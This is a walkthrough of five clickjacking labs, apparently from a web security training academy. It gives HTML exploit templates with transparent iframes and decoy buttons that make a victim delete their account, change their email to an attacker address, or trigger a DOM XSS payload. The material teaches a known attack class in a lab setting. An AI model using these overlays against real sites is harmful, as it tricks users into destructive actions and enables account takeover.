# Some cases of Clickjacking

## 1. Basic clickjacking with CSRF token protection

Log in to your account with `username = wiener` , `password = peter` on the target website.

Go to the exploit server and paste the following HTML template into the Body section:

```
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

Make the following adjustments to the template:

- Replace `YOUR-LAB-ID` in the iframe `src` attribute with your unique lab ID.

- Substitute suitable pixel values for the $height_value and $width_value variables of the iframe (we suggest 700px and 500px respectively).

- Substitute suitable pixel values for the $top_value and $side_value variables of the decoy web content so that the "Delete account" button and the "Test me" decoy action align (we suggest 300px and 60px respectively).
  
- Set the opacity value `$opacity` to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
  
Click Store and then View exploit.

Hover over Test me and ensure the cursor changes to a hand indicating that the div element is positioned correctly. Do not actually click the "Delete account" button yourself. If you do, the lab will be broken and you will need to wait until it resets to try again (about 20 minutes). If the div does not line up properly, adjust the top and left properties of the style sheet.

Once you have the div element lined up correctly, change "Test me" to "Click me" and click Store.

Click on Deliver exploit to victim and the lab should be solved.

## 2. Clickjacking with form input data prefilled from a URL parameter

Log on to the account with `username = wiener` , `password = peter`

Change the email into:  `ian@hacker.com`

Using Burp, the Proxy tab proceeds to search for the `my-account/change-email` section. Then `Send to repeater`.

In the repeater, when sending with the `POST` method, the response side returns
a result of `302 Found`. Therefore, we proceed to change the `POST` method to `GET` and send back => Return that found `ian@hacker.com`

Go back to the website and click on `Go to exploit server` to proceed with the change 
structure the body and occupy the server with the following information:

```
<style>

   iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }   
    
</style>

<div> Test me </div>

<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

Make the following adjustments to the template:

- Replace `YOUR-LAB-ID` with your unique lab ID so that the URL points to the target website's user account page, which contains the "Update email" form.
  
- Substitute suitable pixel values for the `$height_value` and `$width_value` variables of the iframe (we suggest 700px and 500px respectively).

- Substitute suitable pixel values for the `$top_value` and `$side_value` variables of the decoy web content so that the "Update email" button and the "Test me" decoy action align (we suggest 400px and 80px respectively).

- Set the opacity value `$opacity` to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.

## 3. Clickjacking with a frame buster script

You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

to solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: `wiener:peter`

## 4. Exploiting clickjacking vulnerability to trigger DOM-based XSS

Go to the exploit server and paste the following HTML template into the Body section:

```
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
</style>
<div>Test me</div>
<iframe
src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

Make the following adjustments to the template:

- Replace `YOUR-LAB-ID` in the iframe `src` attribute with your unique lab ID so that the URL points to the target website's "Submit feedback" page.

-  Substitute suitable pixel values for the $height_value and $width_value variables of the iframe (we suggest 700px and 500px respectively).

-  Substitute suitable pixel values for the $top_value and $side_value variables of the decoy web content so that the "Submit feedback" button and the "Test me" decoy action align (we suggest 610px and 80px respectively).

-  Set the opacity value `$opacity` to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
  
Click Store and then View exploit. Hover over "Test me" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties of the style sheet.

Click Test me. The print dialog should open.

Change "Test me" to "Click me" and click Store on the exploit server.

Now click on Deliver exploit to victim and the lab should be solved.

## 5. Multistep clickjacking

Log in to your account with `username = wiener` , `password = peter on the target website and go to the user account page.

Go to the exploit server and paste the following HTML template into the "Body" section:

```
<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
   .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

Make the following adjustments to the template:

- Replace` YOUR-LAB-ID` with your unique lab ID so that URL points to the target website's user account page.
  
- Substitute suitable pixel values for the $width_value and $height_value variables of the iframe (we suggest 500px and 700px respectively).
  
- Substitute suitable pixel values for the $top_value1 and $side_value1 variables of the decoy web content so that the "Delete account" button and the "Test me first" decoy action align (we suggest 330px and 50px respectively).
  
- Substitute a suitable value for the $top_value2 and $side_value2 variables so that the "Test me next" decoy action aligns with the "Yes" button on the confirmation page (we suggest 285px and 225px respectively).

- Set the opacity value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
  
Click Store and then View exploit.

Hover over "Test me first" and ensure the cursor changes to a hand indicating that the div element is positioned correctly (DELETE ACCOUNT). If not, adjust the position of the div element by modifying the top and left properties inside the firstClick class of the style sheet.

Click Test me first then hover over Test me next and ensure the cursor changes to a hand indicating that the div element is positioned correctly (YES). If not, adjust the position of the div element by modifying the top and left properties inside the secondClick class of the style sheet.

Once you have the div element lined up correctly, change "Test me first" to "Click me first", "Test me next" to "Click me next" and click Store on the exploit server.

Now click on Deliver exploit to victim and the lab should be solved.
